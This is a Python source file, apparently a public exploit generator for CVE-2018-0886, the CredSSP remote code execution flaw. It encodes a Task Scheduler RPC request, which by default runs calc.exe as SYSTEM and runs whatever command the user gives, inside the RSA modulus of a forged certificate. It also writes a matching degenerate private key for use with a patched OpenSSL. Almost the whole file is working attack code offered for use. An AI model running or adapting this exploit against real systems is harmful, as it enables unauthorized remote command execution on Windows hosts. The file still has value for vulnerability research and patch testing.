#!/usr/bin/python
'''
Script to generate command for CVE-2018-0886.
See usage.
'''

from math_helper import *
from bitstring import BitArray
from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5.rpcrt import *
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import atsvc,epm,rrp,lsat
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.uuid import uuidtup_to_bin, bin_to_string
import random,sys,os
import rsa
from ct.crypto.asn1.x509 import *
from ct.crypto.asn1.x509_common import *
import datetime

FREEDOMBITS = 16
INCBY = 7 #number of bytes to increment
E = 65537

def createCmd(domain, user, path):
    '''
    Creates the cmd buffer to run. The path is the task to execute.
    '''
    req = tsch.SchRpcRegisterTask("00000200 00000000 03000000 00000000 00000000 00000000 03000000 00000000 61006100 00000000 47050000 00000000 00000000 00000000 47050000 00000000 3C003F00 78006D00 6C002000 76006500 72007300 69006F00 6E003D00 22003100 2E003000 22002000 65006E00 63006F00 64006900 6E006700 3D002200 55005400 46002D00 31003600 22003F00 3E000D00 0A003C00 54006100 73006B00 20007600 65007200 73006900 6F006E00 3D002200 31002E00 32002200 20007800 6D006C00 6E007300 3D002200 68007400 74007000 3A002F00 2F007300 63006800 65006D00 61007300 2E006D00 69006300 72006F00 73006F00 66007400 2E006300 6F006D00 2F007700 69006E00 64006F00 77007300 2F003200 30003000 34002F00 30003200 2F006D00 69007400 2F007400 61007300 6B002200 3E000D00 0A002000 20003C00 52006500 67006900 73007400 72006100 74006900 6F006E00 49006E00 66006F00 3E000D00 0A002000 20002000 20003C00 44006100 74006500 3E003200 30003100 37002D00 30003500 2D003100 30005400 30003600 3A003200 39003A00 32003800 3C002F00 44006100 74006500 3E000D00 0A002000 20002000 20003C00 41007500 74006800 6F007200 3E004100 64006D00 69006E00 69007300 74007200 61007400 6F007200 3C002F00 41007500 74006800 6F007200 3E000D00 0A002000 20003C00 2F005200 65006700 69007300 74007200 61007400 69006F00 6E004900 6E006600 6F003E00 0D000A00 20002000 3C005400 72006900 67006700 65007200 73003E00 0D000A00 20002000 20002000 3C005400 69006D00 65005400 72006900 67006700 65007200 3E000D00 0A002000 20002000 20002000 20003C00 53007400 61007200 74004200 6F007500 6E006400 61007200 79003E00 32003000 31003700 2D003000 35002D00 31003000 54003100 34003A00 30003000 3A003000 30003C00 2F005300 74006100 72007400 42006F00 75006E00 64006100 72007900 3E000D00 0A002000 20002000 20002000 20003C00 45006E00 61006200 6C006500 64003E00 74007200 75006500 3C002F00 45006E00 61006200 6C006500 64003E00 0D000A00 20002000 20002000 3C002F00 54006900 6D006500 54007200 69006700 67006500 72003E00 0D000A00 20002000 3C002F00 54007200 69006700 67006500 72007300 3E000D00 0A002000 20003C00 53006500 74007400 69006E00 67007300 3E000D00 0A002000 20002000 20003C00 4D007500 6C007400 69007000 6C006500 49006E00 73007400 61006E00 63006500 73005000 6F006C00 69006300 79003E00 49006700 6E006F00 72006500 4E006500 77003C00 2F004D00 75006C00 74006900 70006C00 65004900 6E007300 74006100 6E006300 65007300 50006F00 6C006900 63007900 3E000D00 0A002000 20002000 20003C00 44006900 73006100 6C006C00 6F007700 53007400 61007200 74004900 66004F00 6E004200 61007400 74006500 72006900 65007300 3E007400 72007500 65003C00 2F004400 69007300 61006C00 6C006F00 77005300 74006100 72007400 49006600 4F006E00 42006100 74007400 65007200 69006500 73003E00 0D000A00 20002000 20002000 3C005300 74006F00 70004900 66004700 6F006900 6E006700 4F006E00 42006100 74007400 65007200 69006500 73003E00 74007200 75006500 3C002F00 53007400 6F007000 49006600 47006F00 69006E00 67004F00 6E004200 61007400 74006500 72006900 65007300 3E000D00 0A002000 20002000 20003C00 41006C00 6C006F00 77004800 61007200 64005400 65007200 6D006900 6E006100 74006500 3E007400 72007500 65003C00 2F004100 6C006C00 6F007700 48006100 72006400 54006500 72006D00 69006E00 61007400 65003E00 0D000A00 20002000 20002000 3C005300 74006100 72007400 57006800 65006E00 41007600 61006900 6C006100 62006C00 65003E00 66006100 6C007300 65003C00 2F005300 74006100 72007400 57006800 65006E00 41007600 61006900 6C006100 62006C00 65003E00 0D000A00 20002000 20002000 3C005200 75006E00 4F006E00 6C007900 49006600 4E006500 74007700 6F007200 6B004100 76006100 69006C00 61006200 6C006500 3E006600 61006C00 73006500 3C002F00 52007500 6E004F00 6E006C00 79004900 66004E00 65007400 77006F00 72006B00 41007600 61006900 6C006100 62006C00 65003E00 0D000A00 20002000 20002000 3C004900 64006C00 65005300 65007400 74006900 6E006700 73003E00 0D000A00 20002000 20002000 20002000 3C004400 75007200 61007400 69006F00 6E003E00 50005400 31003000 4D003C00 2F004400 75007200 61007400 69006F00 6E003E00 0D000A00 20002000 20002000 20002000 3C005700 61006900 74005400 69006D00 65006F00 75007400 3E005000 54003100 48003C00 2F005700 61006900 74005400 69006D00 65006F00 75007400 3E000D00 0A002000 20002000 20002000 20003C00 53007400 6F007000 4F006E00 49006400 6C006500 45006E00 64003E00 74007200 75006500 3C002F00 53007400 6F007000 4F006E00 49006400 6C006500 45006E00 64003E00 0D000A00 20002000 20002000 20002000 3C005200 65007300 74006100 72007400 4F006E00 49006400 6C006500 3E006600 61006C00 73006500 3C002F00 52006500 73007400 61007200 74004F00 6E004900 64006C00 65003E00 0D000A00 20002000 20002000 3C002F00 49006400 6C006500 53006500 74007400 69006E00 67007300 3E000D00 0A002000 20002000 20003C00 41006C00 6C006F00 77005300 74006100 72007400 4F006E00 44006500 6D006100 6E006400 3E007400 72007500 65003C00 2F004100 6C006C00 6F007700 53007400 61007200 74004F00 6E004400 65006D00 61006E00 64003E00 0D000A00 20002000 20002000 3C004500 6E006100 62006C00 65006400 3E007400 72007500 65003C00 2F004500 6E006100 62006C00 65006400 3E000D00 0A002000 20002000 20003C00 48006900 64006400 65006E00 3E006600 61006C00 73006500 3C002F00 48006900 64006400 65006E00 3E000D00 0A002000 20002000 20003C00 52007500 6E004F00 6E006C00 79004900 66004900 64006C00 65003E00 66006100 6C007300 65003C00 2F005200 75006E00 4F006E00 6C007900 49006600 49006400 6C006500 3E000D00 0A002000 20002000 20003C00 57006100 6B006500 54006F00 52007500 6E003E00 66006100 6C007300 65003C00 2F005700 61006B00 65005400 6F005200 75006E00 3E000D00 0A002000 20002000 20003C00 45007800 65006300 75007400 69006F00 6E005400 69006D00 65004C00 69006D00 69007400 3E005000 54003700 32004800 3C002F00 45007800 65006300 75007400 69006F00 6E005400 69006D00 65004C00 69006D00 69007400 3E000D00 0A002000 20002000 20003C00 50007200 69006F00 72006900 74007900 3E003700 3C002F00 50007200 69006F00 72006900 74007900 3E000D00 0A002000 20003C00 2F005300 65007400 74006900 6E006700 73003E00 0D000A00 20002000 3C004100 63007400 69006F00 6E007300 3E000D00 0A002000 20002000 20003C00 45007800 65006300 3E000D00 0A002000 20002000 20002000 20003C00 43006F00 6D006D00 61006E00 64003E00 63006100 6C006300 2E006500 78006500 3C002F00 43006F00 6D006D00 61006E00 64003E00 0D000A00 20002000 20002000 3C002F00 45007800 65006300 3E000D00 0A002000 20003C00 2F004100 63007400 69006F00 6E007300 3E000D00 0A003C00 2F005400 61007300 6B003E00 00000000 06000000 00000000 00000000 00000000 03000000 01000000 00000200 00000000 01000000 00000000 00000200 00000000 00000000 00000000 01000000 00000000 16000000 00000000 00000000 00000000 16000000 00000000 50005200 45004500 4D005000 54005C00 41006400 6D006900 6E006900 73007400 72006100 74006F00 72000000 00000000 00000000 00000000".replace(" ","").decode('hex'),isNDR64=True)
    if domain:
        req['pCreds'][0]['userId']=u'%s\\%s\x00' % (domain,user)
    else:
        req['pCreds'][0]['userId']=u'%s\x00' % (user)
    x=u"""<?xml version="1.0"?>
    <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <Triggers>
    <RegistrationTrigger/>
    </Triggers>
    <Settings>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
    </IdleSettings>
    </Settings>
    <Actions>
    <Exec>
    <Command>%s</Command>
    </Exec>
    </Actions>
    </Task>\x00""" % (path)
    req.fields['path']["ReferentID"]= int(('3082010a02820101'),16)
    req['xml'] = x.replace('\n    ','') #notice the padding
    s=str(req)#
    s+=((4-len(s)%8)%8)*'\x00' #here we align the output so that no further pading bytes will be added
    return req ,s

def dump_req(req,s):
    #Notice that we don't take the first 8 bytes of the buffer.
    #These will be part of the public key structure , and we have no control over them (any byte DWORD will do).
    #The entire buffer can be tested sperately (it should work as signed).
    print >> sys.stderr, "Request Details:"
    print >> sys.stderr, str(req.dump())
    print >> sys.stderr, "\nCMD:"
    print >> sys.stderr, s[8:].encode('hex')
    print >> sys.stderr, "\nLength:"
    print >> sys.stderr, str(len(s[8:]))

def gen(cmd):
    condStr=cmd # the cmd should be in hex string already 
    next=-1
    while True:
        next+=2#random.randrange(2**(FREEDOMBITS))
        cond=int(condStr+ INCBY*"00",16) + next
        if cond&1==1:
            yield cond

def findPrime(cmd,e):
    numgen = gen(cmd)
    tries = 0
    while True:
        tries+=1

        if tries%50 ==0:
            print >> sys.stderr, ("Tried "+str(tries)+" primes...")

        num=numgen.next()
        if isPrime(num):
            eg=egcd(num-1,e)
            d=eg[2] % (num-1)
            if eg[0]!=1: #gcd
                print >> sys.stderr, ("bad gcd. what are the odds?") # this also means that it is not prime
                continue

            return num, d

def replaceKey(certFile, subPubKey):
    s = ''
    mainSection = 0
    for i in open(certFile,'rt'):
        if '---' in i:
            mainSection=(not mainSection)
        elif mainSection:
            s+=i[:-1]
    cert = Certificate.decode(s.decode('base64'))
    arr = BitArray(bytes=subPubKey)
    cert['tbsCertificate']['subjectPublicKeyInfo']['subjectPublicKey'] = arr.bin
    bytes = cert.encode()
    st = bytes.encode('base64').replace('\n', '')

    print "-----BEGIN CERTIFICATE-----"
    for i in xrange(0,len(st), 64):
        print st[i:i+64]
    print "-----END CERTIFICATE-----"

def genCertAndPriv(certFile, privFile, e, n, d):
    e = E
    p = n - 1
    q = n - 1
    exp1 = e
    exp2 = d
    coef = e
    r = rsa.PrivateKey(n, e, d, p, q, exp1=e, exp2=e,coef=e)
    r.exp1 = 0
    r.exp2 = 0
    r.coef = 0
    r.p = 0
    r.q = 0
    open(privFile, 'wt').write(r.save_pkcs1())
    a =rsa.PublicKey(n,e)
    replaceKey(certFile,a._save_pkcs1_der())

def main():
    from argparse import ArgumentParser,RawTextHelpFormatter

    parser = ArgumentParser(description='''
The script generates from a valid certificate a new certificate with a public key that contains a valid DCE/RPC request for CVE-2018-0886.

It uses the TaskScheduler interface (86D35949-83C9-4044-B424-DB363231FD0C version 1.0) to create a task of the user choise.
By default runs as System and outputs the certificate to stdout.

Notice that a patched version of openssl should be used with the private key. ''', formatter_class=RawTextHelpFormatter)

    parser.add_argument("cmd", help="command to run")
    parser.add_argument("--E", help="use different E for RSA", type=int, default=E)
    parser.add_argument("-c", "--cert", dest="certFile",
                        help="cert file to read. Should be a valid cert for rdp. Not neccessarily for the same domain. Is required in normal mode.", default=None)
    parser.add_argument("-k", "--privFile",
                        help="Private key file name to generate. Is required in normal mode.")
    parser.add_argument("--dump", action="store_true", dest="dump", default=False, help="Dump the request details.")
    parser.add_argument("-o", "--outCert", default=None, help="certificate file to output. By default will be written to stdout.")
    parser.add_argument("-d","--domain", help="NT Domain Name of the account under which the task runs.  Needed only if there is a domain username.",default="")
    parser.add_argument("-u","--user" ,
                        help="Username under which the task runs. By default, it uses LocalSystem(which should work in most cases)."
                             "In case of domain user, the username should match the attacked user.",
                        default="S-1-5-18")

    args = parser.parse_args()
    if (not args.certFile) or (not args.privFile):
        print >> sys.stderr, "Warning: Private/Cert not set. Dump mode set."
        print >> sys.stderr, ''
        args.dump = True

    if args.certFile and not os.path.exists(args.certFile):
        print >> sys.stderr, "Cert file not found"
        print >> sys.stderr, ''
        args.certFile = None

    req,cmd = createCmd(args.domain, args.user, args.cmd)
    if args.dump:
        dump_req(req,cmd)
    if args.certFile and args.privFile:
        n, d = findPrime(cmd[8:].encode('hex'), args.E)
        if args.outCert:
            sys.stdout=open(args.outCert,"w")
        genCertAndPriv(args.certFile,args.privFile,args.E,n,d)
        sys.stdout.flush()

if __name__=="__main__":
    main()
